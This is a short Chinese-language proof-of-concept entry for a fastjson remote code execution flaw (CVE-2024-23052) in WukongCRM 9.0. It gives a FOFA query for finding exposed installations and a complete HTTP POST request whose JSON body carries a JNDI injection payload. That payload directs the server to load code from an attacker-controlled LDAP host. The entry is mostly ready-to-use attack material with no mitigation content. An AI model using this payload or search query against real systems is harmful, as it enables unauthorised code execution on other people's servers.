## 悟空CRM9.0-fastjson远程代码执行漏洞(CVE-2024-23052)

WuKongOpenSource WukongCRM v.72crm_9.0.1_20191202 中的一个问题允许远程攻击者通过 fastjson 组件中的 parseObject() 函数执行任意代码。

## fofa

```
"悟空CRM"
```

## poc

```
POST /CrmCustomer/queryPageList HTTP/1.1
Host: localhost:8080
Content-Length: 115
Content-Type: application/json;charset=UTF-8
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Connection: close

{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://ip:port/Basic/Command/calc"}"
```

![image-20240607170803103](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406071708172.png)